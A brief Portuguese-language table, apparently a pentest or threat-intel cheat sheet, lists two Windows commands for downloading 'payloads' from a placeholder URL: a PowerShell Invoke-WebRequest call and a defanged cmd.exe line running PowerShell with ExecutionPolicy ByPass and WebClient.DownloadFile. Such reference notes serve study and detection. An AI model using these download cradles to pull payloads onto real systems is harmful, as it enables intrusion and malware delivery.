| COMANDO | DESCRIÇÃO |
|--------------------------------------------|--------------------------------------------------------------------------------------|
| powershell Invoke-webrequest -URI <URL> -outfile <file_location_on_system> | Comando utilizado para download de cargas de uma determinada URL e indicação de path |
| cmd[.]exe /c powershell[.]exe -ExecutionPolicy ByPass -WindowStyle Normal (New-Object System[.]Net[.]WebClient).DownloadFile('<URL>', '<LOCAL A SER SALVO>') | omando utilizado para baixar um arquivo via CMD e salvá-lo em um local específico no sistema | 
